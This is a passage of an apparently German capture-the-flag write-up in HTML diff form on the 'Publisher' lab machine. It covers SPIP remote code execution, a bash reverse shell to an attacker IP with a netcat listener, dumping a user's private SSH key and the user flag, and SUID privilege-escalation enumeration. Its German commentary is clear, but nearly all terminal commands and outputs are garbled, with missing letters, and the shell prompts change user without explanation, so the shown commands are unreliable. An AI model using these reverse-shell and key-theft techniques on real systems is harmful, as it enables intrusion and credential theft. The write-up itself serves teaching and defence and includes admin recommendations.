+                <br><strong>Bewertung:</strong> Fantastisch! Der erfolgreiche Test der RCE-Schwachstelle ist ein kritischer Durchbruch. Ich habe nun die Möglichkeit, beliebige Befehle auf dem Zielsystem mit den Berechtigungen des Webservers (`www-data`) auszuführen. Dies ist der primäre Vektor für den initialen Zugriff. Der Plan B (RCE) hat funktioniert, auch wenn John vielleicht noch am Passwort arbeitet.
+                <br><strong>Empfehlung (Pentester):</strong> Teste RCE-Exploits immer zuerst mit harmlosen Befehlen wie `sleep`, `id` oder `whoami`, um die Ausführbarkeit zu bestätigen, bevor du versuchst, Reverse Shells auszuführen.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Webserver-Logs auf Anzeichen von Befehlsausführung, wie z.B. ungewöhnliche Parameter in Anfragen oder spezifische Fehler, die durch die Exploitation verursacht werden. Patchen Sie die SPIP-Installation umgehend (siehe PoC-Empfehlungen).
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtls/si-rce-exit]
+└─# <span class="command">time pythn3 sk..y -u htt://ulisher.hmv/si -c 'slee 5'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">real	5,25s</span>
+<span class="command">user	0,21s</span>
+<span class="command">sys	0,02s</span>
+<span class="command">cu	4%</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+
+              <p class="comment">
+                <strong>Analyse:</strong> Nachdem ich die Ausnutzbarkeit der RCE-Schwachstelle mit dem `sleep`-Befehl bestätigt habe, ist der nächste Schritt, eine interaktive Shell auf dem Zielsystem zu erlangen. Ich verwende erneut das Exploit-Skript (hier `spk.py`) mit der SPIP-URL (`-u http://publisher.hmv/spip`), aber diesmal mit einem Befehl, der eine Reverse Shell zu meinem Angreifersystem initiiert (`-c 'bash -c "bash -i >& /dev/tcp/192.168.2.199/1234 0>&1"'`). Dieser Befehl startet eine `/bin/bash`-Shell auf dem Zielsystem, leitet deren Standard-Input, -Output und -Error an eine TCP-Verbindung zu meiner IP-Adresse (`192.168.2.199`) auf Port `1234` um. Parallel dazu habe ich auf meinem Angreifersystem einen Netcat-Listener auf Port `1234` gestartet (`nc -lvnp 1234`), um die eingehende Verbindung abzufangen.
+                Die Ausgabe des Netcat-Listeners zeigt, dass er auf Port `1234` lauscht (`listening on [any] 1234 ...`) und dann erfolgreich eine Verbindung vom Zielsystem (`connect to [192.168.2.199] from (UNKNOWN) [192.168.2.38] 58178`) empfängt. Nach der Verbindung erhalte ich eine Bash-Shell, identifizierbar an der Eingabeaufforderung `www-data@41c976e507f8:/home/think/spip/spip$`. Die Meldungen "bash: cannot set terminal process group" und "bash: no job control in this shell" sind typische Hinweise darauf, dass es sich um eine einfache, nicht voll interaktive Shell handelt, aber sie ist voll funktionsfähig für die Befehlsausführung.
+                <br><strong>Bewertung:</strong> Fantastisch! Die RCE-Schwachstelle konnte erfolgreich ausgenutzt werden, um eine Reverse Shell als Benutzer `www-data` zu erlangen. `www-data` ist der Standardbenutzer, unter dem der Apache-Webserver und damit auch das SPIP-CMS laufen. Dies markiert den Initial Access auf das System. Obwohl ich noch keine Root-Rechte habe, kann ich nun lokale Befehle ausführen, das Dateisystem enumerieren und nach Wegen zur Privilegien-Eskalation suchen. Die alternative Methode, den Admin-Passwort zu knacken (falls erfolgreich), hätte mir wahrscheinlich Zugriff auf das SPIP-Backend gegeben, aber nicht direkt eine System-Shell. Die RCE war hier der schnellere und direktere Weg.
+                <br><strong>Empfehlung (Pentester):</strong> Sobald eine RCE-Schwachstelle bestätigt ist, nutze sie, um eine stabile Reverse Shell zu erlangen. Bevorzuge Bash- oder Python-basierte Reverse Shells, da sie oft stabiler sind als Netcat-eigene.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Aktualisieren Sie SPIP umgehend auf eine nicht verwundbare Version (>= 4.2.1). Überwachen Sie ausgehenden Netzwerkverkehr von Webservern auf ungewöhnliche Verbindungen (z.B. Reverse Shells zu unbekannten IPs auf hohen Ports). Implementieren Sie EDR/HIDS auf Ihren Servern, um verdächtige Prozessausführungen (wie Shells, die unter dem Webserver-Benutzer gestartet werden) zu erkennen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtls/si-rce-exit]
+└─# <span class="command">ythn3 sk..y -u htt://ulisher.hmv/si -c 'ash -c "ash -i >& /ev/tc/192.168.2.199/1234 0>&1"'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 1234</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 1234 ...</span>
+<span class="password">cnnect t [192.168.2.199] frm (UNKNOWN) [192.168.2.38] 58178</span>
+<span class="command">ash: cannt set terminal rcess gr (1): Ina rriate icl fr evice</span>
+<span class="command">ash: n jb cntrl in this shell</span>
+<span class="command">www-ata@41c976e507f8:/hme/think/si/si$</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="comment">
+                <strong>Analyse:</strong> Nachdem ich eine Shell als Benutzer `www-data` erlangt habe, beginne ich mit der lokalen System-Enumeration, um Wege zur Privilegien-Eskalation zu finden. Ich navigiere zum Home-Verzeichnis des Benutzers `think` (`cd /home/think`) und liste dessen Inhalt auf (`ls -la`). Die Ausgabe zeigt, dass es sich um das Home-Verzeichnis des Benutzers `think` handelt. Interessanterweise finde ich hier auch das Verzeichnis `spip`, das dem Benutzer `www-data` gehört und ausführbare Berechtigungen für `www-data` und die Gruppe `www-data` hat (`drwxr-x---`). Dies deutet darauf hin, dass das SPIP-CMS unter diesem Benutzer und in diesem Verzeichnis betrieben wird, obwohl es sich im Home-Verzeichnis von `think` befindet – eine ungewöhnliche Konfiguration. Außerdem finde ich die Datei `user.txt`, die Root gehört (`root root`) aber für andere lesbar ist (`-rw-r--r--`). Dies ist die User-Flag.
+                <br><strong>Bewertung:</strong> Das Auffinden des Home-Verzeichnisses von `think` und der `user.txt` Datei ist wichtig. Die Tatsache, dass die `user.txt` dem Root-Benutzer gehört, aber für jeden lesbar ist, ist eine Fehlkonfiguration bei den Dateiberechtigungen und erlaubt mir das Auslesen der User-Flag. Die ungewöhnliche Platzierung des SPIP-Verzeichnisses im Home von `think` und dessen Berechtigungen sind ebenfalls bemerkenswert, könnten aber (in diesem Fall) weniger relevant sein als die SUIDs oder andere Systemkonfigurationen.
+                <br><strong>Empfehlung (Pentester):</strong> Beginne die lokale Enumeration immer im Dateisystem, insbesondere in den Home-Verzeichnissen anderer Benutzer und in Standardpfaden wie `/tmp`, `/opt`, `/var`. Suche nach Konfigurationsdateien, Skripten, Passwörtern, Keys, SUID-Binaries und ungewöhnlichen Dateiberechtigungen.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Dateiberechtigungen aller sensiblen Dateien, einschließlich Flag-Dateien, um sicherzustellen, dass nur berechtigte Benutzer diese lesen können. Vermeiden Sie die Installation von Webanwendungen in Benutzer-Home-Verzeichnissen. Stellen Sie sicher, dass Dienste unter Benutzern mit minimalen Berechtigungen laufen (`www-data` ist hier angemessen, aber die Rechte innerhalb des Home-Verzeichnisses von `think` sind ungewöhnlich).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-ata@41c976e507f8:/hme/think/si/si$ <span class="command">c /hme/think</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-ata@41c976e507f8:/hme/think$ <span class="command">ls -la</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ttal 48</span>
+<span class="command">drwxr-xr-x 8 think    think    4096 Fe 10  2024 .</span>
+<span class="command">drwxr-xr-x 1 rt     rt     4096 ec  7  2023 ..</span>
+<span class="command">lrwxrwrwx 1 rt     rt        9 Jun 21  2023 .ash_histry -> /ev/null</span>
+<span class="command">-rw-r--r-- 1 think    think     220 Nv 14  2023 .ash_lgut</span>
+<span class="command">-rw-r--r-- 1 think    think    3771 Nv 14  2023 .ashrc</span>
+<span class="command">drwx------ 2 think    think    4096 Fe 10  2024 .cache</span>
+<span class="command">drwx------ 3 think    think    4096 ec  8  2023 .cnfig</span>
+<span class="command">drwx------ 3 think    think    4096 Fe 10  2024 .gnug</span>
+<span class="command">drwxrwxr-x 3 think    think    4096 Jan 10  2024 .lcal</span>
+<span class="command">-rw-r--r-- 1 think    think     807 Nv 14  2023 .rfile</span>
+<span class="command">lrwxrwrwx 1 think    think       9 Fe 10  2024 .ythn_histry -> /ev/null</span>
+<span class="command">drwxr-xr-x 2 think    think    4096 Jan 10  2024 .ssh</span>
+<span class="command">lrwxrwrwx 1 think    think       9 Fe 10  2024 .vimin -> /ev/null</span>
+<span class="command">drwxr-x--- 5 www-ata www-ata 4096 ec 20  2023 si</span>
+<span class="command">-rw-r--r-- 1 rt     rt       35 Fe 10  2024 user.txt</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich lese den Inhalt der `user.txt` Datei aus, die ich gerade gefunden habe. Der Befehl `cat user.txt` gibt den Inhalt der User-Flag aus: `fa229046d44eda6a3598c73ad96f4ca5`. Dies ist der Beweis für das Erreichen der User-Ebene.
+                <br><strong>Bewertung:</strong> Die User-Flag ist erfolgreich erbeutet. Dies bestätigt, dass der initiale Zugriff und die erste Phase der Enumeration erfolgreich waren.
+                <br><strong>Empfehlung (Pentester):</strong> Dokumentiere gefundene Flags umgehend.
+                <br><strong>Empfehlung (Admin):</strong> Korrigieren Sie die Dateiberechtigungen für sensible Dateien wie Flag-Dateien, sodass sie nur für den Eigentümer lesbar sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-ata@41c976e507f8:/hme/think$ <span class="command">cat user.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">fa229046d44eda6a3598c73ad96f4ca5</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich prüfe das `.ssh` Verzeichnis im Home von `think` (`ls -la .ssh/`) und lese den Inhalt der privaten Schlüsseldatei `id_rsa` aus (`cat .ssh/id_rsa`). Die Ausgabe zeigt den vollständigen privaten SSH-Schlüssel. Dies deutet darauf hin, dass der Benutzer `think` SSH-Zugang hat und dieser Schlüssel verwendet werden könnte.
+                <br><strong>Bewertung:</strong> Das Auffinden einer privaten SSH-Schlüsseldatei ist ein sehr wichtiger Fund. Auch wenn ich bereits als `www-data` auf dem System bin, könnte dieser Schlüssel Zugang zu `think`'s Konto über SSH ermöglichen, was potenziell andere Berechtigungen oder Zugriffspunkte freilegen könnte. Es ist eine Form der horizontalen Privilegien-Eskalation oder ein alternativer Zugriffspfad. Der Schlüssel selbst ist nicht passwortgeschützt (`ssh2john` sagt später "has no password!"), was die Nutzung vereinfacht.
+                <br><strong>Empfehlung (Pentester):</strong> Suche immer nach SSH-Schlüsseln (.ssh/id_rsa) in Benutzer-Home-Verzeichnissen. Lade sie herunter und versuche, dich damit via SSH anzumelden. Prüfe, ob sie passwortgeschützt sind.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass private SSH-Schlüssel immer mit einer Passphrase geschützt sind. Überprüfen Sie die Dateiberechtigungen von `.ssh` Verzeichnissen und den Schlüsseln, um sicherzustellen, dass sie nicht für andere Benutzer lesbar sind. Speichern Sie private Schlüssel nicht auf Servern, es sei denn, es ist unbedingt notwendig.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-ata@41c976e507f8:/hme/think$ <span class="command">ls -la .ssh/</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">ttal 20</span>
+<span class="command">drwxr-xr-x 2 think think 4096 Jan 10  2024 .</span>
+<span class="command">drwxr-xr-x 8 think think 4096 Fe 10  2024 ..</span>
+<span class="command">-rw-r--r-- 1 rt  rt   569 Jan 10  2024 authrized_keys</span>
+<span class="command">-rw-r--r-- 1 think think 2602 Jan 10  2024 i_rsa</span>
+<span class="command">-rw-r--r-- 1 think think  569 Jan 10  2024 i_rsa.u</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-ata@41c976e507f8:/hme/think$ <span class="command">cat .ssh/i_rsa</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">-----BEGIN PENSSH PRIVATE KEY-----</span>
+<span class="password">3lentuHlmeAAAAHG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="password">NhAAAAAwEAAQAAAYEAxPvc9ijUlJA4ilyvkW0ryYASBdvmBalsElsmclw7FMgiPW8tDK</span>
+<span class="password">iXyZneBISGryJiZ8VzFqmKRYciADwlJzq+92iKUHTVMjxxg18WvF0WnK2lI5TQ7X</span>
+<span class="password">Y8+1CUV67y4UXrASf8l7lKIED24bXjkDGVrCHwScQ/nIIFxyli262JiJTjh9Jgx</span>
+<span class="password">SBjaDOELBBxcn78YM9dyafImAXx96H5k+8vC8I3bkwiCnnhuKKJ11T4b8lMsbrgqty</span>
+<span class="password">RYfCJap27zJ24a1aR5Un+Ec2XVdn2ahmftS05b1DNEAJxLuSGX9mFhLJyheRe8lv</span>
+<span class="password">rk5EZNgh14YlXG/E9yIbx9R5k0ekdZjVV0iqIHmcinotlV5nXBRPVeH71JgV</span>
+<span class="password">QFKQyqVM4w6oQDqQslvneS959e095sJEwz1j9aT3Z6Z28KAPCjELvkADcncuMQ</span>
+<span class="password">T+z6QVUr0CCjgSRhw4Gsv3yeJS8l/bciL5QoydAAAFiD95i1eYtaAAAAB3Nsshcn</span>
+<span class="password">EAAAGAMTVc9ijUlJA4ilyvkW0ryYASBdmAlsElsmclw7FMgiPW8tDK</span>
+<span class="password">iXyZneISHryJiZ8VzFqmKRYciADwlJzq+92iKUHTVMjxxg18WvF0WnK2lI5TQ7X</span>
+<span class="password">Y8+1CUV67y4UXrASf8l7lKIED24bXjkDGVrCHwScQ/nIIFxyli262JiJTjh9Jgx</span>
+<span class="password">SBjaDOELBBxcn78YM9dyafImAXx96H5k+8vC8I3bkwiCnnhuKKJ11T4b8lMsbrgqty</span>
+<span class="password">RYfCJap27zJ24a1aR5Un+Ec2XVdn2ahmftS05b1DNEAJxLuSGX9mFhLJyheRe8lv</span>
+<span class="password">rk5EZNgh14YlXG/E9yIbx9R5k0ekdZjVV0iqIHmcinotlV5nXBRPVeH71JgV</span>
+<span class="password">QFKQyqVM4w6oQDqQslvneS959e095sJEwz1j9aT3Z6Z28KAPCjELvkADcncuMQ</span>
+<span class="password">T+z6QVUr0CCjgSRhw4Gsv3yeJS8l/bciL5QoydAAAAMEAHIasGkXjA6c4eoSlEuDRcaDF</span>
+<span class="password">mTQHx3Jl3M8+A+0+2aaTrWyO5zWhUfnWRzHpvGAi6+zbepsgNFiNIST2igdmAUQV</span>
+<span class="password">VxlDuMz7d5DExdNAasQnEMx65BAOpj1aeUcfSMhWttknhgcnzhREIrtv7gR5</span>
+<span class="password">9F0+4GrRLirK0nZJuuvKEPOoDNHzMEt4tm+MhPpqHW17fxjSHNv4J4WkV</span>
+<span class="password">8Q78MfnSrRXIrisKavI6MPzHBtEUDUJDUtIpXVx2r5L3DBmNGEQVS5vWNGkLR</span>
+<span class="password">z2F3dNNzK6d0e8ciXF0qZxFLx+hqwxi6jCig6A0jciRl1WVltqqwMf15qKW</span>
+<span class="password">xmkL1Xn4jP3tbH9Us7ayLCErlvMzlnHr+nswZNADKKIznrVKZMVzl4Q</span>
+<span class="password">QafNmMJlXm4ltcSRVHPe1IWESr4ryX9HRkdplGE04StCG4XiRBG1aQAA</span>
+<span class="password">MEAsFmX8iE4UlEmz467uDcvLP539E2wjc5U4rlCijPY0GRIu8ZQkyxKb4V569l</span>
+<span class="password">DbLhbfRFKTRO7nWKr4USoYvlRgMuCsiNtDTWbcqkPWlH0dGO7HbDJ1uCJqjT+OE</span>
+<span class="password">6P0ZAHAPflznC4xww8Mg68Hwss8Ld8wsZ4hMFxCZdtuZOlYiMGMtextVDGL</span>
+<span class="password">IEjNxGd4wo7cNT7NsNG7BIq7iTee559xtlkynvIqAAAAwDnTnH27D1RxiV</span>
+<span class="password">ThENf8IzY8LFccKJjnDwBdFkyE9krNR71xyK8t52EsLCRileZN7CMAFiRIH6WPft</span>
+<span class="password">FX8AXalXJLmlTL16+3CpNnjjsRKLJtHmH6MGDAPxgYE4Zr+HG6mnaeNM3YSr</span>
+<span class="password">vKrIKed5LNANkLSeknbzxsERbyKGIa89lYWtrHCHsl1wrFKB9ikfa2DGSvh</span>
+<span class="password">6XkNGp6e8HrtBn/0rBfVZjveM1MAAADBANoC+jOLbABk2rKEtTY1MsbcMv2ale</span>
+<span class="password">vM04PvBE22VsJGKrWic786Z0QVhnbNeJenLigk50EM1WrKvHvND0WtNhNWHThiyFr</span>
+<span class="password">LsHJHfAUSGHQfC0Z06MtmlwZUuYE9JnZZGtln47BdOumADCfmRxelSOv55</span>
+<span class="password">M8X1rGlGEnXqGuw917aaHPPBnSfqtMkkXZ55yiI9uhtcrRanGFlEYPSCR18Ppcr596</span>
+<span class="password">H40A+YKJ0iNtyTAAAA90aGluaHRwbisherAQID</span>
+<span class="password">-----END PENSSH PRIVATE KEY-----</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Um zu prüfen, ob der gerade gefundene private SSH-Schlüssel für den Benutzer `think` tatsächlich ohne Passwort verwendet werden kann, kopiere ich ihn auf mein Angreifersystem und verwende das Tool `ssh2john` aus der John the Ripper Suite. Dieses Tool konvertiert SSH-Schlüssel in ein Format, das John verarbeiten kann, und zeigt auch an, ob eine Passphrase vorhanden ist. Ich führe `ssh2john issh > hash2` aus, wobei `issh` die lokale Kopie des Schlüssels ist. Die Ausgabe `issh has no password!` bestätigt, dass der Schlüssel *keine* Passphrase hat.
+                <br><strong>Bewertung:</strong> Die Tatsache, dass der private SSH-Schlüssel von `think` keine Passphrase hat, macht ihn zu einem direkten Authentifizierungsvektor für das Konto von `think`. Ich kann mich nun jederzeit mit diesem Schlüssel als `think` via SSH anmelden. Dies ist ein weiterer, potenziell nützlicher Zugangsweg, falls die SUID-PrivEsc-Methode fehlschlagen sollte oder um weitere lokale Enumeration als ein anderer Benutzer durchzuführen.
+                <br><strong>Empfehlung (Pentester):</strong> Überprüfe immer gefundene private SSH-Schlüssel auf Passphrasenlosigkeit. Nutze `ssh2john` oder ähnliche Tools. Passphrasenlose Schlüssel sind sofort nutzbar.
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Stellen Sie sicher, dass alle privaten SSH-Schlüssel auf Ihrem System mit einer Passphrase geschützt sind. Passphrasenlose Schlüssel sollten nur in sehr spezifischen, automatisierten Kontexten unter strengster Kontrolle eingesetzt werden. Führen Sie Audits durch, um passphrasenlose Schlüssel zu identifizieren und zu entfernen oder zu schützen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh2jhn issh > hash2</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">issh has n asswrd!</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ein wichtiger Schritt bei der Privilegien-Eskalation ist die Suche nach SUID- oder SGID-Binaries. Programme mit gesetztem SUID-Bit werden mit den Berechtigungen des Dateieigentümers ausgeführt (oft root), unabhängig davon, wer das Programm startet. Dies kann von einem weniger privilegierten Benutzer ausgenutzt werden, um Root-Befehle auszuführen. Ich verwende den Befehl `find / -perm -u=s -type f 2>/dev/null`, um auf dem gesamten Dateisystem (`/`) nach regulären Dateien (`-type f`) zu suchen, bei denen das SUID-Bit für den Eigentümer (`-perm -u=s`) gesetzt ist. Die Umleitung `2>/dev/null` unterdrückt Fehlermeldungen für Verzeichnisse, auf die ich als `www-data` keinen Zugriff habe. Die Ausgabe listet mehrere Standard-SUID-Binaries auf (`/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/su`, etc.), aber auch ein ungewöhnliches Binary: `/usr/sbin/run_container`.
+                <br><strong>Bewertung:</strong> Standard-SUID-Binaries wie `passwd` oder `sudo` haben bekannte, oft sichere Implementierungen (es sei denn, sie sind veraltet oder falsch konfiguriert, wie wir später bei `sudo` sehen werden). Das Binary `/usr/sbin/run_container` ist jedoch nicht Standard und sofort verdächtig. Es könnte eine benutzerdefinierte Anwendung sein, die mit Root-Rechten läuft und potenzielle Schwachstellen enthält, die ein Angreifer ausnutzen kann. Dies ist ein vielversprechender Vektor für die Privilegien-Eskalation.
+                <br><strong>Empfehlung (Pentester):</strong> Suche immer nach SUID/SGID-Binaries (`find / -perm -u=s -type f` und `find / -perm -g=s -type f`). Konzentriere dich auf nicht-standardmäßige Binaries. Überprüfe ihre Funktionalität und suche auf Plattformen wie GTFOBins ([Link: GTFOBins | Ziel: https://gtfobins.github.io/]) oder durch statische/dynamische Analyse nach Missbrauchsmöglichkeiten.
+                <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID/SGID-Binaries auf Ihrem System. Führen Sie regelmäßige Audits durch, um alle Binaries mit diesen Berechtigungen zu identifizieren und deren Notwendigkeit und Sicherheit zu überprüfen. Entfernen Sie SUID/SGID-Bits, wenn sie nicht absolut notwendig sind.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@ulisher:~$ <span class="command">fin / -tye f -erm -u=s 2>/ev/null</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">/usr/li/licyk-1/lkit-agent-heleer-1</span>
+<span class="command">/usr/li/enssh/ssh-keysign</span>
+<span class="command">/usr/li/eject/mcryt-get-evice</span>
+<span class="command">/usr/li/us-1.0/us-aemn-lanch-heleer</span>
+<span class="command">/usr/li/xrg/Xrg.wra</span>
+<span class="command">/usr/sin/</span>
+<span class="command">/usr/sin/rn_cntainer</span>
+<span class="command">/usr/in/at</span>
+<span class="command">/usr/in/fuseramnt</span>
+<span class="command">/usr/in/gaswrd</span>
+<span class="command">/usr/in/sud</span>
+<span class="command">/usr/in/chsh</span>
+<span class="command">/usr/in/asswrd</span>
+<span class="command">/usr/in/mnt</span>
+<span class="command">/usr/in/su</span>
+<span class="command">/usr/in/newgr</span>
+<span class="command">/usr/in/kec</span>
+<span class="command">/usr/in/amnt</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Um mehr über die Funktionalität des SUID-Binaries `/usr/sbin/run_container` zu erfahren, verwende ich das Tool `strings`. `strings /usr/sbin/run_container` extrahiert alle druckbaren Zeichenketten aus der Binärdatei. Diese Zeichenketten können Dateinamen, Pfade, Fehlermeldungen, Konfigurationsstrings oder Hinweise auf die interne Logik des Programms enthalten. Die Ausgabe zeigt mehrere interessante Strings, darunter `/bin/bash` und `/opt/run_container.sh`. Das Vorhandensein dieser Pfade deutet stark darauf hin, dass das `run_container`-Binary möglicherweise ein Skript unter `/opt/run_container.sh` ausführt, möglicherweise mit erhöhten Privilegien (da das Binary SUID-Root ist).
+                <br><strong>Bewertung:</strong> Die `strings`-Ausgabe liefert den entscheidenden Hinweis für die Privilegien-Eskalation. Das SUID-Binary `/usr/sbin/run_container` scheint ein Skript `/opt/run_container.sh` auszuführen. Wenn ich die Möglichkeit habe, den Inhalt dieses Skripts zu ändern, kann ich beliebige Befehle als Root ausführen. Dies ist ein klassischer SUID-Wrapper-Exploit-Vektor.
+                <br><strong>Empfehlung (Pentester):</strong> Verwende `strings` für SUID/SGID-Binaries, um schnell Pfade zu Konfigurationsdateien, Skripten oder anderen Ressourcen zu finden, die vom Binary verwendet werden. Überprüfe dann die Berechtigungen dieser referenzierten Dateien.
+                <br><strong>Empfehlung (Admin):</strong> Erstellen Sie keine SUID-Binaries, die ungeprüft Skripte von einem Pfad ausführen, dessen Schreibberechtigungen für normale Benutzer zugänglich sind. Stellen Sie sicher, dass alle Dateien, die von SUID-Binaries referenziert oder ausgeführt werden, nur von Root schreibbar sind.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@ulisher:/tm$ <span class="command">strings /usr/sin/rn_cntainer</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">/li64/l-linx-x86-64.s.2</span>
+<span class="command">lic.s.6</span>
+<span class="command">__stack_chk_fail</span>
+<span class="command">execve</span>
+<span class="command">__cxa_finalize</span>
+<span class="command">__lic_start_ain</span>
+<span class="command">GLIC_2.2.5</span>
+<span class="command">GLIC_2.4</span>
+<span class="command">_ITM_eregisterTMClneTale</span>
+<span class="command">__gmn_start__</span>
+<span class="command">_ITM_registerTMClneTale</span>
+<span class="command">u+UH</span>
+<span class="command">[]AA]AA_</span>
+<span class="command">/in/ash</span>
+<span class="command">/t/rn_cntainer.sh</span>
+:*3$"
+<span class="command">GCC: (Untu 9.4.0-1utu1~20.04.2) 9.4.0</span>
+crtstff.c
+eregister_tm_clnes
+___glal_trs_ax
+cmleted.8061
+___glal_trs_ax_fini_array_entry
+frae_mmy
+__frae_mmy_init_array_entry
+rn_cntainer.c
+__FRAME_END__
+__init_array_en
+_YNAMIC
+__init_array_start
+__GNU_EH_FRAME_HR
+_GLAL_FFSET_TALE_
+__lic_cs_fini
+_ITM_eregisterTMClneTale
+_eata
+__stack_chk_fail@@GLIC_2.4
+__lic_start_ain@@GLIC_2.2.5
+execve@@GLIC_2.2.5
+__ata_start
+__gmn_start__
+__ds_hanle
+_I_stin_use
+__lic_cs_init
+__ss_start
+ain
+__TMC_END__
+_ITM_registerTMClneTale
+__cxa_finalize@@GLIC_2.2.5
+.symta
+.strta
+.shstrta
+.inter
+.nte.gn.rrty
+.nte.gn.uil-i
+.nte.A-tag
+.gn.hash
+.ynsmy
+.ynstr
+.gn.versin
+.gn.versin_r
+.rela.yn
+.rela.lt
+.init
+.lt.gt
+.lt.sec
+.text
+.fini
+.rdata
+.eh_frae_hr
+.eh_frae
+.init_array
+.fini_array
+.ynaic
+.ata
+.ss
+.cmment
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich prüfe die Dateiberechtigungen des Skripts `/opt/run_container.sh` mit `ls -l /opt/run_container.sh`. Die Ausgabe zeigt `-rwxrwxrwx 1 root root 1715 Mar 29 2024`. Das ist ein kritischer Fund! Die Berechtigungen sind 777, was bedeutet, dass *jeder* Benutzer (Eigentümer `root`, Gruppe `root`, und alle anderen) die Datei lesen, schreiben und ausführen darf. Dies bestätigt die Schwachstelle, die durch die `strings`-Ausgabe nahegelegt wurde: Ein SUID-Root-Binary (`run_container`) führt ein Skript aus, das von jedem Benutzer geändert werden kann.
+                Ich versuche, den Inhalt des Skripts mit `cat /opt/run_container.sh` auszulesen, aber erhalte "Permission denied". Dies ist seltsam, da die Berechtigungen 777 Lesezugriff erlauben sollten. Möglicherweise gibt es zusätzliche Sicherheitsmechanismen oder eine fehlerhafte Anzeige der Berechtigungen in dieser Shell. Unabhängig davon sind die Schreibberechtigungen kritisch. Ich kann auch versuchen, das Skript direkt mit `/lib64/ld-linux-x86-64.so.2 /bin/bash` auszuführen, um zu prüfen, ob es als `www-data` ausführbar ist (es ist eine Shell), aber das ist nur ein Test, um die Shell-Ausführung in dieser Umgebung zu verstehen. Das Wichtige ist, dass ich die Datei ändern kann.
+                <br><strong>Bewertung:</strong> Die 777-Berechtigungen für `/opt/run_container.sh` stellen eine kritische Schwachstelle dar. Jeder Benutzer, einschließlich `www-data` (ich), kann den Inhalt dieses Skripts ändern. Da das SUID-Root-Binary `/usr/sbin/run_container` dieses Skript ausführt, kann ich beliebigen Code mit Root-Rechten ausführen, indem ich das Skript manipuliere. Dies ist der Hauptvektor zur Privilegien-Eskalation.
+                <br><strong>Empfehlung (Pentester):</strong> Wenn du ein SUID-Binary findest, das ein Skript ausführt, prüfe sofort die Berechtigungen des Skripts. Wenn es für deinen aktuellen Benutzer schreibbar ist, hast du einen direkten Weg zu den Berechtigungen des SUID-Binaries (hier Root).
+                <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Ändern Sie die Berechtigungen für `/opt/run_container.sh` umgehend, sodass nur der Eigentümer (Root) Schreibrechte hat (z.B. `chmod 744 /opt/run_container.sh` oder `chmod 700 /opt/run_container.sh`). Überprüfen Sie alle Skripte, die von SUID-Binaries ausgeführt werden, und stellen Sie sicher, dass sie und die Verzeichnisse, in denen sie sich befinden, sicher konfiguriert sind. Vermeiden Sie das Ausführen von Skripten durch SUID-Binaries, wenn möglich.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@ulisher:/tm$ <span class="command">ls -l /t/rn_cntainer.sh</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">-rwxrwxrwx 1 rt rt 1715 Mar 29  2024 /t/rn_cntainer.sh</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@ulisher:/tm$ <span class="command">cat /t/rn_cntainer.sh</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">cat: /t/rn_cntainer.sh: ermissin enie</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">think@ulisher:/tm$ <span class="command">/li64/l-linx-x86-64.s.2 /in/ash</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
